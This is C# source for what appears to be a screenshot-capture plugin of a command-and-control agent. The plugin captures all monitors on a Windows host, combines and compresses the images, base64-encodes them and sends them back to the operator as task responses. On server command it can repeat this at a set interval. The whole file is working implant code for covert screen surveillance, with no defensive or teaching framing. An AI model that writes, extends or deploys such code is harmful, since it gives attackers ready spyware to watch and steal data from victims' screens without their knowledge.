using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO.Compression;
using System.Runtime.InteropServices;
using System.Text.Json;
using System.Threading;
using System.Threading.Tasks;
using Agent.Interfaces;
using Agent.Models;
using Agent.Utilities;
using screenshot;


namespace Agent
{
    public class Plugin : IPlugin
    {
        public string Name => "screenshot";
        private IMessageManager messageManager { get; set; }
        private readonly ScreenshotScheduler scheduler;

        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner, IPythonManager pythonManager)
        {
            this.messageManager = messageManager;
            scheduler = new ScreenshotScheduler((taskId, _) => CaptureAndSendScreenshot(taskId));
        }

        [System.Runtime.Versioning.SupportedOSPlatform("windows")]
        public async Task Execute(ServerJob job)
        {
            ScreenshotArgs args = JsonSerializer.Deserialize<ScreenshotArgs>(job.task.parameters);
            if(args is null){
                return;
            }

            if (args.interval <= 0)
            {
                scheduler.Cancel(job.task.id);
                await CaptureAndSendScreenshot(job.task.id);
            }
            else
            {
                scheduler.Schedule(
                    job.task.id,
                    TimeSpan.FromSeconds(args.interval),
                    job.cancellationtokensource.Token);
                messageManager.AddTaskResponse(new TaskResponse
                {
                    completed = true,
                    user_output = $"Capturing screenshots every {args.interval} seconds!!.",
                    task_id = job.task.id,
                });
            }
        }
        [System.Runtime.Versioning.SupportedOSPlatform("windows")]
        private Task CaptureAndSendScreenshot(string taskId)
        {
            try
            {
                var bitmaps = ScreenCapture.Capture();
                try
                {
                    if (bitmaps.Count == 0)
                    {
                        throw new InvalidOperationException("No displays were available for capture.");
                    }

                    var combinedWidth = bitmaps.Sum(bitmap => bitmap.Width);
                    var maxHeight = bitmaps.Max(bitmap => bitmap.Height);
                    using var combinedBitmap = new Bitmap(combinedWidth, maxHeight);
                    using (var graphics = Graphics.FromImage(combinedBitmap))
                    {
                        var x = 0;
                        foreach (var bitmap in bitmaps)
                        {
                            graphics.DrawImage(bitmap, x, 0);
                            x += bitmap.Width;
                        }
                    }

                    var converter = new ImageConverter();
                    var bitmapBytes = (byte[]?)converter.ConvertTo(combinedBitmap, typeof(byte[]))
                        ?? throw new InvalidOperationException("Screenshot encoding returned no data.");
                    using var memoryStream = new MemoryStream();
                    using (var gzipStream = new GZipStream(memoryStream, CompressionMode.Compress, leaveOpen: true))
                    {
                        gzipStream.Write(bitmapBytes, 0, bitmapBytes.Length);
                    }

                    messageManager.AddTaskResponse(new TaskResponse
                    {
                        completed = true,
                        user_output = "Screenshot captured.",
                        task_id = taskId,
                        process_response = new Dictionary<string, string>
                        {
                            { "message", Convert.ToBase64String(memoryStream.ToArray()) }
                        },
                    });
                }
                finally
                {
                    foreach (var bitmap in bitmaps) bitmap.Dispose();
                }
            }
            catch (Exception exception)
            {
                messageManager.Write($"Failed to capture screenshot: {exception}", taskId, true, "error");
            }

            return Task.CompletedTask;
        }
    }
    [System.Runtime.Versioning.SupportedOSPlatform("windows")]
    internal class ScreenCapture
    {
        internal static List<Bitmap> Capture()
        {
            return DisposableCollector.Collect(GetScreens(), screen =>
            {
                var bitmap = new Bitmap(screen.Width, screen.Height);
                try
                {
                    using var graphics = Graphics.FromImage(bitmap);
                    graphics.CopyFromScreen(screen.X, screen.Y, 0, 0, bitmap.Size);
                    return bitmap;
                }
                catch
                {
                    bitmap.Dispose();
                    throw;
                }
            });
        }

        private static IEnumerable<Screen> GetScreens()
        {
            var screens = new List<Screen>();
            foreach (var displayInfo in GetDisplayInfos())
            {
                var bounds = new Rectangle(
                    displayInfo.Bounds.X,
                    displayInfo.Bounds.Y,
                    displayInfo.Bounds.Width,
                    displayInfo.Bounds.Height);

                screens.Add(new Screen(bounds));
            }
            return screens;
        }

        private class Screen
        {
            public int X { get; }
            public int Y { get; }
            public int Width { get; }
            public int Height { get; }

            public Screen(Rectangle bounds)
            {
                X = bounds.X;
                Y = bounds.Y;
                Width = bounds.Width;
                Height = bounds.Height;
            }
        }

        [DllImport("user32.dll")]
        private static extern bool EnumDisplayMonitors(IntPtr hdc, IntPtr lprcClip, MonitorEnumProc lpfnEnum, IntPtr dwData);

        private delegate bool MonitorEnumProc(IntPtr hMonitor, IntPtr hdcMonitor, ref RECT lprcMonitor, IntPtr dwData);

        [StructLayout(LayoutKind.Sequential)]
        private struct RECT
        {
            public int left;
            public int top;
            public int right;
            public int bottom;
        }

        private class DisplayInfo
        {
            public Rectangle Bounds { get; set; }
        }

        private static List<DisplayInfo> GetDisplayInfos()
        {
            var monitors = new List<DisplayInfo>();

            var proc = new MonitorEnumProc((IntPtr hMonitor, IntPtr hdcMonitor, ref RECT lprcMonitor, IntPtr dwData) =>
            {
                var mi = new DisplayInfo();
                mi.Bounds = new Rectangle(lprcMonitor.left, lprcMonitor.top, lprcMonitor.right - lprcMonitor.left, lprcMonitor.bottom - lprcMonitor.top);
                monitors.Add(mi);

                return true;
            });

            if (!EnumDisplayMonitors(IntPtr.Zero, IntPtr.Zero, proc, IntPtr.Zero))
            {
                throw new System.ComponentModel.Win32Exception();
            }

            return monitors;
        }
    }
}
